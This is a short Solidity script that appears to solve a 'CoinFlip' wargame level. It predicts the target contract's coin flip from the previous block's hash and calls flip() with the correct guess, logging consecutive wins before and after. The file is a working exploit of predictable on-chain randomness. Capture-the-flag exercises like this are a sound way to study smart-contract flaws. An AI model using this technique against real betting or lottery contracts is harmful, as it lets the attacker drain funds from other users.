// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../libs/forge-std/src/console.sol";
import "./CoinFlip.sol";

contract MySolution {
    function run() external {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        CoinFlip myContract = CoinFlip(0x94099942864EA81cCF197E9D71ac53310b1468D8);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        uint256 wins = myContract.consecutiveWins();

        console.log("Current wins are: ", wins);

        if (coinFlip == 1) {
            bool res = myContract.flip(true);
            console.log("Response was: ", res);
        } else {
            bool res = myContract.flip(false);
            console.log("Response was: ", res);
        }

        uint256 wins2 = myContract.consecutiveWins();
        console.log("Updated wins are: ", wins2);
    }
}
